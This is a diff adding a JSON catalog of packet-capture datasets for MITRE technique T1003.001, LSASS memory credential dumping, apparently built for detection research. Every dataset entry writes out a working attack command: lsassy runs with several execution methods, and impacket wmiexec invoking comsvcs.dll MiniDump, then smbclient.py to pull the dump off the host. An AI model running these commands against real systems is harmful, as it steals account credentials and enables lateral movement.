@@ -1,0 +1,253 @@
+{
+  "mitre": {
+    "technique_id": "T1003.001",
+    "technique_name": "OS Credential Dumping: LSASS Memory",
+    "url": "https://attack.mitre.org/techniques/T1003/001/",
+    "tactics": ["TA0006"]
+  },
+  "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.",
+  "artifacts": [
+    "SMB connections to ADMIN$ share for remote execution and dump file exfiltration",
+    "DCE/RPC calls to SVCCTL (Service Control Manager) protocol for remote service creation",
+    "DCE/RPC calls to ATSVC/TSCH (Task Scheduler) protocol for remote task creation",
+    "DCOM activation for MMC20.Application ExecuteShellCommand",
+    "WMI (Windows Management Instrumentation) remote process execution via IWbemServices",
+    "comsvcs.dll MiniDump procedure invocation via rundll32",
+    "remote creation of LSASS memory dump files on ADMIN$ (typically .dmp files in C:\\Windows\\Temp)",
+    "SMB read operations to retrieve LSASS dump files from the remote host",
+    "authentication attempts with elevated privileges (local Administrator or domain privileged account)",
+    "failed access attempts due to insufficient privileges or LSA Protection (PPL/RunAsPPL)",
+    "failed authentication attempts",
+    "credential extraction from LSASS process memory"
+  ],
+  "datasets": {
+    "pcaps": [
+      {
+        "id": "t1003.001-internal-auth-lsass-dump-exfil-wmi-lsassy",
+        "file": "pcaps/techniques/t1003.001/t1003.001_internal_auth_lsass_dump_exfil_wmi__lsassy.pcap",
+        "name": "Internal LSASS dump and exfiltration via WMI - successful (lsassy)",
+        "description": "Internal authenticated LSASS memory dump using lsassy with the comsvcs method and WMI as remote execution vector, showing successful creation of the LSASS dump on the target and SMB exfiltration of the dump file for offline credential extraction.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [445, 135]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "lsass",
+          "lsassy",
+          "comsvcs",
+          "dump",
+          "exfil",
+          "wmi",
+          "credential",
+          "dumping",
+          "smb",
+          "rpc",
+          "dcom",
+          "tcp",
+          "445",
+          "135",
+          "critical"
+        ],
+        "command": "lsassy -m comsvcs -e wmi -u Administrator -p 'P@ssword123!' 10.10.10.50 --timeout 60"
+      },
+      {
+        "id": "t1003.001-internal-auth-lsass-dump-exfil-svcctl-lsassy",
+        "file": "pcaps/techniques/t1003.001/t1003.001_internal_auth_lsass_dump_exfil_svcctl__lsassy.pcap",
+        "name": "Internal LSASS dump and exfiltration via Service Control Manager - successful (lsassy)",
+        "description": "Internal authenticated LSASS memory dump using lsassy with the comsvcs method and SMB/SVCCTL (Service Control Manager) as remote execution vector, showing successful creation of a remote service that triggers the LSASS dump and SMB exfiltration of the dump file for offline credential extraction.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [445, 135]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "lsass",
+          "lsassy",
+          "comsvcs",
+          "dump",
+          "exfil",
+          "svcctl",
+          "service",
+          "credential",
+          "dumping",
+          "smb",
+          "rpc",
+          "tcp",
+          "445",
+          "135",
+          "critical"
+        ],
+        "command": "lsassy -m comsvcs -e smb -u Administrator -p 'P@ssword123!' 10.10.10.50"
+      },
+      {
+        "id": "t1003.001-internal-auth-lsass-dump-exfil-mmc-lsassy",
+        "file": "pcaps/techniques/t1003.001/t1003.001_internal_auth_lsass_dump_exfil_mmc__lsassy.pcap",
+        "name": "Internal LSASS dump and exfiltration via DCOM MMC - successful (lsassy)",
+        "description": "Internal authenticated LSASS memory dump using lsassy with the comsvcs method and MMC (MMC20.Application DCOM object) as remote execution vector, showing successful creation of the LSASS dump on the target and SMB exfiltration of the dump file for offline credential extraction.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [445, 135]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "lsass",
+          "lsassy",
+          "comsvcs",
+          "dump",
+          "exfil",
+          "mmc",
+          "dcom",
+          "credential",
+          "dumping",
+          "smb",
+          "rpc",
+          "tcp",
+          "445",
+          "135",
+          "critical"
+        ],
+        "command": "lsassy -m comsvcs -e mmc -u Administrator -p 'P@ssword123!' 10.10.10.50 --timeout 120"
+      },
+      {
+        "id": "t1003.001-internal-auth-lsass-dump-exfil-lsassy-procdump",
+        "file": "pcaps/techniques/t1003.001/t1003.001_internal_auth_lsass_dump_exfil__lsassy-procdump.pcap",
+        "name": "Internal LSASS dump and exfiltration via procdump - successful (lsassy)",
+        "description": "Internal authenticated LSASS memory dump using lsassy with the procdump method, showing upload of procdump.exe to the target via SMB, remote execution to dump LSASS memory, and SMB exfiltration of the dump file for offline credential extraction.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [445, 135]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "lsass",
+          "lsassy",
+          "procdump",
+          "sysinternals",
+          "dump",
+          "exfil",
+          "credential",
+          "dumping",
+          "smb",
+          "rpc",
+          "tcp",
+          "445",
+          "135",
+          "critical"
+        ],
+        "command": "lsassy -m procdump -O procdump_path=./procdump/procdump.exe -u Administrator -p 'P@ssword123!' 10.10.10.50 --timeout 60"
+      },
+      {
+        "id": "t1003.001-internal-auth-lsass-dump-exfil-impacket-wmiexec",
+        "file": "pcaps/techniques/t1003.001/t1003.001_internal_auth_lsass_dump_exfil__impacket-wmiexec.pcap",
+        "name": "Internal LSASS dump and exfiltration via wmiexec - successful (impacket-wmiexec)",
+        "description": "Internal authenticated LSASS memory dump using impacket-wmiexec to invoke comsvcs.dll MiniDump via rundll32 over WMI, followed by smbclient.py to exfiltrate the LSASS dump file from the remote host for offline credential extraction.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [445, 135]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "lsass",
+          "dump",
+          "exfil",
+          "wmiexec",
+          "impacket",
+          "wmi",
+          "comsvcs",
+          "rundll32",
+          "smbclient",
+          "credential",
+          "dumping",
+          "smb",
+          "rpc",
+          "tcp",
+          "445",
+          "135",
+          "critical"
+        ],
+        "command": "wmiexec.py 'Administrator:P@ssword123!@10.10.10.50' 'tasklist /fi \"imagename eq lsass.exe\"'; wmiexec.py 'Administrator:P@ssword123!@10.10.10.50' 'rundll32.exe comsvcs.dll, MiniDump <lsass_pid> C:\\Windows\\Temp\\debug.dmp full'; smbclient.py 'Administrator:P@ssword123!@10.10.10.50'"
+      },
+      {
+        "id": "t1003.001-internal-auth-lsass-dump-exfil-denied-lsassy",
+        "file": "pcaps/techniques/t1003.001/t1003.001_internal_auth_lsass_dump_exfil_denied__lsassy.pcap",
+        "name": "Internal LSASS dump and exfiltration - failed access denied (lsassy)",
+        "description": "Internal authenticated LSASS memory dump attempt using lsassy showing failed access due to insufficient privileges (user authenticated but lacks local Administrator rights required to access LSASS process memory).",
+        "criticality": "high",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [445, 135]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "lsass",
+          "lsassy",
+          "comsvcs",
+          "dump",
+          "exfil",
+          "failed",
+          "denied",
+          "noprivs",
+          "credential",
+          "dumping",
+          "smb",
+          "rpc",
+          "tcp",
+          "445",
+          "135",
+          "high"
+        ],
+        "command": "lsassy -m comsvcs -e smb -u testuser -p 'P@ssword123!' 10.10.10.50 --timeout 120 -vv"
+      },
+      {
+        "id": "t1003.001-internal-unauth-lsass-dump-exfil-failed-badpwd-lsassy",
+        "file": "pcaps/techniques/t1003.001/t1003.001_internal_auth_lsass_dump_exfil_failed__lsassy.pcap",
+        "name": "Internal LSASS dump and exfiltration - failed bad password (lsassy)",
+        "description": "Internal unauthenticated LSASS memory dump attempt using lsassy with the comsvcs method and MMC remote execution vector, showing failed authentication due to incorrect credentials.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [445, 135]
+        },
+        "filter": [
+          "internal",
+          "unauth",
+          "lsass",
+          "lsassy",
+          "comsvcs",
+          "dump",
+          "exfil",
+          "mmc",
+          "dcom",
+          "failed",
+          "badpwd",
+          "credential",
+          "dumping",
+          "smb",
+          "rpc",
+          "tcp",
+          "445",
+          "135",
+          "high"
+        ],
+        "command": "lsassy -m comsvcs -e mmc -u Administrator -p 'WrongPass!' 10.10.10.50 --timeout 120 -vv"
+      }
+    ]
+  },
+  "metadata": {
+    "domain": "enterprise",
+    "confidence": "high",
+    "schema_version": "1.0"
+  }
+}
